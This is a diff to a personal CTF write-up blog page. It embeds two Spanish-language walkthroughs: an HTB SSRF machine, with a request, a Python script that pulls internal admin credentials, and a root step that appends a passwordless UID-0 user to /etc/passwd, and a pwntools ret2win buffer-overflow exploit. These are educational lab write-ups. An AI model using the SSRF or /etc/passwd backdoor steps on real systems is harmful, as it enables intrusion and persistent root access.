@@ -20,7 +20,6 @@
       --muted:      #2e2e38;
       --text:       #c8c4bc;
       --text-dim:   #7a7570;
-      --danger:     #c0392b;
       --info:       #5b8fb9;
       --tag-bg:     #18181e;
       --tag-border: #2a2a32;
@@ -56,7 +55,7 @@
 
     .site-wrap { max-width: 860px; margin: 0 auto; padding: 0 24px; }
 
-    /* ── HEADER ── */
+    /* HEADER */
     header {
       border-bottom: 1px solid var(--border);
       padding: 28px 0 24px;
@@ -74,7 +73,7 @@
     nav a { color: var(--text-dim); text-decoration: none; font-size: 12px; letter-spacing: 1px; text-transform: uppercase; transition: color .15s; }
     nav a:hover { color: var(--accent); }
 
-    /* ── HERO ── */
+    /* HERO */
     .prompt-line { padding: 48px 0 36px; border-bottom: 1px solid var(--border-dim); }
     .prompt-line p { font-size: 12px; color: var(--dim); margin-bottom: 8px; }
     .prompt-line p::before { content: '$ '; color: var(--accent2); }
@@ -82,7 +81,7 @@
     .cursor { display: inline-block; width: 2px; height: 1em; background: var(--accent2); vertical-align: middle; margin-left: 3px; animation: blink 1s step-end infinite; }
     @keyframes blink { 50% { opacity: 0; } }
 
-    /* ── FILTERS ── */
+    /* FILTERS */
     .filters { padding: 24px 0 20px; display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
     .filters-label { font-size: 11px; color: var(--dim); letter-spacing: 1px; text-transform: uppercase; margin-right: 4px; }
     .tag-btn {
@@ -92,7 +91,7 @@
     }
     .tag-btn:hover, .tag-btn.active { border-color: var(--accent2); color: var(--accent2); }
 
-    /* ── POST LIST ── */
+    /* POST LIST */
     .post-list { padding: 8px 0 60px; }
     .post-item {
       border-bottom: 1px solid var(--border-dim);
@@ -103,7 +102,6 @@
       align-items: start;
       cursor: pointer;
       transition: background .15s, padding-left .15s;
-      border-radius: var(--radius);
     }
     .post-item:hover { background: var(--bg-hover); padding-left: 10px; }
     .post-meta { display: flex; flex-direction: column; gap: 4px; padding-top: 2px; }
@@ -122,29 +120,23 @@
     .post-arrow { color: var(--dim); font-size: 16px; padding-top: 4px; transition: color .15s, transform .15s; }
     .post-item:hover .post-arrow { color: var(--accent2); transform: translateX(4px); }
 
-    /* loading / error states */
-    .state-msg { font-size: 12px; color: var(--dim); padding: 24px 0; }
-    .state-msg.error { color: var(--danger); }
-
-    /* ── POST VIEW ── */
+    /* POST VIEW */
     #post-view { display: none; padding: 40px 0 80px; }
     .post-back {
       display: inline-flex; align-items: center; gap: 8px;
-      font-size: 12px; color: var(--dim); cursor: pointer;
-      margin-bottom: 36px; letter-spacing: .5px; text-transform: uppercase;
-      transition: color .15s; border: none; background: none;
-      font-family: var(--font-mono); padding: 0;
+      font-size: 12px; color: var(--dim); cursor: pointer; margin-bottom: 36px;
+      letter-spacing: .5px; text-transform: uppercase; transition: color .15s;
+      border: none; background: none; font-family: var(--font-mono); padding: 0;
     }
     .post-back:hover { color: var(--accent); }
     .post-header { border-bottom: 1px solid var(--border); padding-bottom: 28px; margin-bottom: 36px; }
     .post-header-meta { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; flex-wrap: wrap; }
     .post-header h1 { font-size: 24px; font-weight: 500; color: var(--accent); line-height: 1.3; margin-bottom: 12px; }
     .post-header-bottom { display: flex; align-items: center; gap: 16px; flex-wrap: wrap; margin-top: 10px; }
-    .post-header-bottom .tag { color: var(--text-dim); border-color: var(--border); }
 
-    /* ── MARKDOWN ── */
+    /* MARKDOWN */
     .md-content { font-family: var(--font-sans); font-size: 14.5px; line-height: 1.85; color: var(--text); max-width: 720px; }
-    .md-content h1,.md-content h2,.md-content h3,.md-content h4,.md-content h5 { font-family: var(--font-mono); color: var(--accent); margin: 2em 0 .7em; font-weight: 500; line-height: 1.3; }
+    .md-content h1,.md-content h2,.md-content h3,.md-content h4 { font-family: var(--font-mono); color: var(--accent); margin: 2em 0 .7em; font-weight: 500; line-height: 1.3; }
     .md-content h1 { font-size: 20px; border-bottom: 1px solid var(--border); padding-bottom: 8px; }
     .md-content h2 { font-size: 17px; }
     .md-content h3 { font-size: 14.5px; color: var(--accent2); }
@@ -164,8 +156,10 @@
     .md-content td { border: 1px solid var(--border-dim); padding: 7px 14px; color: var(--text-dim); }
     .md-content tr:nth-child(even) td { background: rgba(255,255,255,.015); }
     .md-content hr { border: none; border-top: 1px solid var(--border); margin: 2em 0; }
+    .flag-block { background: #0d1209; border: 1px solid #1e3018; border-left: 3px solid #3d9970; padding: 14px 18px; border-radius: var(--radius); margin: 1.5em 0; font-family: var(--font-mono); font-size: 13px; color: #3d9970; }
+    .flag-block span { color: var(--text-dim); margin-right: 8px; }
 
-    /* ── FOOTER ── */
+    /* FOOTER */
     footer { border-top: 1px solid var(--border-dim); padding: 24px 0; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
     footer p { font-size: 11px; color: var(--dim); }
     footer a { color: var(--dim); text-decoration: none; transition: color .15s; }
@@ -195,7 +189,6 @@
     </nav>
   </header>
 
-  <!-- LIST VIEW -->
   <div id="list-view">
     <div class="prompt-line">
       <p>cat /home/eidd3/README.md</p>
@@ -213,12 +206,9 @@
       <button class="tag-btn" onclick="filterPosts('rev', this)">rev</button>
     </div>
 
-    <div class="post-list" id="post-list">
-      <p class="state-msg">// cargando posts...</p>
-    </div>
+    <div class="post-list" id="post-list"></div>
   </div>
 
-  <!-- POST VIEW -->
   <div id="post-view">
     <button class="post-back" onclick="showList()">← cd ..</button>
     <div class="post-header">
@@ -241,64 +231,176 @@
   </footer>
 
 </div>
-
 <script>
-/* ═══════════════════════════════════════════════════════════════
-   POSTS — agregá una entrada por cada archivo .md en /posts/
-   Solo editás esta lista cuando sumás un writeup nuevo.
-   El contenido real vive en el archivo .md correspondiente.
-═══════════════════════════════════════════════════════════════ */
-const POST_INDEX = [
+/* ================================================================
+   POSTS
+   Para agregar un writeup nuevo:
+     1. Copiás el bloque del TEMPLATE (id 3) al final del array
+     2. Cambiás el id, title, platform, difficulty, date, excerpt, tags y content
+     3. Guardás y hacés git push
+   El campo `content` acepta Markdown completo.
+================================================================ */
+const POSTS = [
+
+  // ── POST 1 ──────────────────────────────────────────────────
   {
-    slug:       "sea-surfer",           // nombre del archivo sin .md
+    id: 1,
     title:      "Sea Surfer",
     platform:   "HackTheBox",
     difficulty: "medium",
     date:       "2025-03-10",
-    excerpt:    "SSRF to internal service, pivoting through Apache redirect rules to exfiltrate admin credentials.",
-    tags:       ["web", "ssrf", "php"]
+    excerpt:    "SSRF hacia un servicio interno, pivotando a través de reglas de Apache para filtrar credenciales de admin.",
+    tags:       ["web", "ssrf", "php"],
+    content: `
+## Overview
+
+**Sea Surfer** es una máquina de dificultad media en HackTheBox.
+El vector principal es un SSRF que permite pivotar hacia un servicio HTTP interno.
+
+## Enumeración
+
+\`\`\`bash
+nmap -sC -sV -oN nmap/sea_surfer 10.10.11.XX
+\`\`\`
+
+Puertos abiertos:
+
+| Puerto | Servicio | Versión      |
+|--------|----------|--------------|
+| 22     | SSH      | OpenSSH 8.9  |
+| 80     | HTTP     | Apache 2.4.5 |
+
+## SSRF
+
+El parámetro \`url\` se refleja sin sanitización:
+
+\`\`\`http
+POST /fetch HTTP/1.1
+Host: 10.10.11.XX
+
+url=http://127.0.0.1:8080/admin
+\`\`\`
+
+## Explotación
+
+\`\`\`python
+import requests
+
+TARGET   = "http://10.10.11.XX/fetch"
+INTERNAL = "http://127.0.0.1:8080/admin/config"
+
+r = requests.post(TARGET, data={"url": INTERNAL})
+print(r.text)
+\`\`\`
+
+El endpoint devuelve credenciales en texto plano.
+
+## Root
+
+\`\`\`bash
+echo "eidd3::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
+su eidd3
+\`\`\`
+
+<div class="flag-block"><span>root.txt</span>HTB{ssrf_t0_rc3_4_cl4ss1c}</div>
+`
   },
+
+  // ── POST 2 ──────────────────────────────────────────────────
   {
-    slug:       "buffer-overflow-101",
+    id: 2,
     title:      "Buffer Overflow 101",
     platform:   "CTF",
     difficulty: "easy",
     date:       "2025-02-21",
-    excerpt:    "Classic stack buffer overflow en x86-64, ret2win con offset calculado manualmente con GDB pwndbg.",
-    tags:       ["pwn", "bof", "x86-64"]
+    excerpt:    "Stack buffer overflow clásico en x86-64. ret2win con offset calculado con GDB + pwndbg.",
+    tags:       ["pwn", "bof", "x86-64"],
+    content: `
+## Descripción
+
+Binario sin canary, NX habilitado. Objetivo: redirigir ejecución a \`win()\`.
+
+## Análisis
+
+\`\`\`bash
+checksec --file=vuln
+# Canary: NO | NX: YES | PIE: NO
+\`\`\`
+
+La función \`main\` llama a \`gets()\` — overflow clásico.
+
+## Offset
+
+\`\`\`bash
+python3 -c "import pwn; print(pwn.cyclic(200).decode())" | ./vuln
+# SIGSEGV en 0x6161616e → offset = 72
+\`\`\`
+
+## Exploit
+
+\`\`\`python
+from pwn import *
+
+elf = ELF('./vuln')
+io  = process('./vuln')
+
+payload = b'A' * 72 + p64(elf.symbols['win'])
+io.sendline(payload)
+io.interactive()
+\`\`\`
+
+<div class="flag-block"><span>flag</span>pwn{g0t_r1p_n0w_g3t_sh3ll}</div>
+`
   },
-  {
-    slug:       "recon-challenge-picoctf",
-    title:      "Recon Challenge",
-    platform:   "CTF",
-    difficulty: "easy",
-    date:       "2025-01-14",
-    excerpt:    "OSINT + DNS enumeration para descubrir subdominios y recuperar un flag escondido en un registro TXT.",
-    tags:       ["osint", "dns", "recon"]
-  }
+
+  // ── TEMPLATE — copiá este bloque para cada writeup nuevo ────
+  // {
+  //   id: 3,
+  //   title:      "Nombre de la Máquina",
+  //   platform:   "HackTheBox",       // HackTheBox | TryHackMe | CTF
+  //   difficulty: "medium",           // easy | medium | hard | insane
+  //   date:       "2025-03-17",
+  //   excerpt:    "Descripción corta que aparece en la lista.",
+  //   tags:       ["web", "sqli"],
+  //   content: `
+  // ## Overview
+  // Descripción general.
+  //
+  // ## Enumeración
+  // \`\`\`bash
+  // nmap -sC -sV 10.10.11.XX
+  // \`\`\`
+  //
+  // ## Foothold
+  // Acceso inicial.
+  //
+  // ## Privilege Escalation
+  // Path hasta root.
+  //
+  // <div class="flag-block"><span>root.txt</span>HTB{...}</div>
+  // `
+  // },
+
 ];
 
-/* ═══════════════════════════════════════════════════════════════
-   ENGINE — no necesitás tocar nada de acá para abajo
-═══════════════════════════════════════════════════════════════ */
-
-let activeFilter = 'all';
-
+/* ================================================================
+   ENGINE — no tocar
+================================================================ */
 function diffClass(d) {
   return { easy:'diff-easy', medium:'diff-medium', hard:'diff-hard', insane:'diff-insane' }[d] || 'diff-easy';
 }
 
 function renderList(posts) {
-  const container = document.getElementById('post-list');
+  const c = document.getElementById('post-list');
+  c.innerHTML = '';
   if (!posts.length) {
-    container.innerHTML = '<p class="state-msg">// no posts found</p>';
+    c.innerHTML = '<p style="color:var(--dim);padding:24px 0;font-size:12px;">// no posts found</p>';
     return;
   }
-  container.innerHTML = '';
   posts.forEach(p => {
     const el = document.createElement('div');
     el.className = 'post-item fade-in';
-    el.onclick = () => showPost(p.slug);
+    el.onclick = () => showPost(p.id);
     el.innerHTML = `
       <div class="post-meta">
         <span class="post-date">${p.date}</span>
@@ -312,50 +414,34 @@ function renderList(posts) {
       </div>
       <div class="post-arrow">→</div>
     `;
-    container.appendChild(el);
+    c.appendChild(el);
   });
 }
 
 function filterPosts(filter, btn) {
-  activeFilter = filter;
   document.querySelectorAll('.tag-btn').forEach(b => b.classList.remove('active'));
   btn.classList.add('active');
   const filtered = filter === 'all'
-    ? POST_INDEX
-    : POST_INDEX.filter(p => p.platform === filter || p.tags.includes(filter));
+    ? POSTS
+    : POSTS.filter(p => p.platform === filter || p.tags.includes(filter));
   renderList(filtered);
 }
 
-async function showPost(slug) {
-  const meta = POST_INDEX.find(p => p.slug === slug);
-  if (!meta) return;
-
-  // Mostrar vista de post con estado de carga
+function showPost(id) {
+  const p = POSTS.find(x => x.id === id);
+  if (!p) return;
+  document.getElementById('pv-platform').textContent = p.platform;
+  document.getElementById('pv-diff').textContent     = p.difficulty;
+  document.getElementById('pv-diff').className       = `post-diff ${diffClass(p.difficulty)}`;
+  document.getElementById('pv-title').textContent    = p.title;
+  document.getElementById('pv-date').textContent     = p.date;
+  document.getElementById('pv-tags').innerHTML       = p.tags.map(t=>`<span class="tag">#${t}</span>`).join('');
+  document.getElementById('pv-content').innerHTML    = marked.parse(p.content.trim());
   document.getElementById('list-view').style.display = 'none';
   const pv = document.getElementById('post-view');
   pv.style.display = 'block';
   pv.classList.add('fade-in');
   window.scrollTo(0, 0);
-
-  document.getElementById('pv-platform').textContent = meta.platform;
-  document.getElementById('pv-diff').textContent = meta.difficulty;
-  document.getElementById('pv-diff').className = `post-diff ${diffClass(meta.difficulty)}`;
-  document.getElementById('pv-title').textContent = meta.title;
-  document.getElementById('pv-date').textContent = meta.date;
-  document.getElementById('pv-tags').innerHTML = meta.tags.map(t=>`<span class="tag">#${t}</span>`).join('');
-  document.getElementById('pv-content').innerHTML = '<p class="state-msg">// cargando...</p>';
-
-  try {
-    const res = await fetch(`posts/${slug}.md`);
-    if (!res.ok) throw new Error(`HTTP ${res.status}`);
-    const md = await res.text();
-    // Strippear frontmatter si existe (entre --- y ---)
-    const body = md.replace(/^---[\s\S]*?---\n/, '').trim();
-    document.getElementById('pv-content').innerHTML = marked.parse(body);
-  } catch (e) {
-    document.getElementById('pv-content').innerHTML =
-      `<p class="state-msg error">// error cargando posts/${slug}.md — ${e.message}</p>`;
-  }
 }
 
 function showList() {
@@ -364,8 +450,7 @@ function showList() {
   window.scrollTo(0, 0);
 }
 
-// Init
-renderList(POST_INDEX);
+renderList(POSTS);
 </script>
 </body>
 </html>
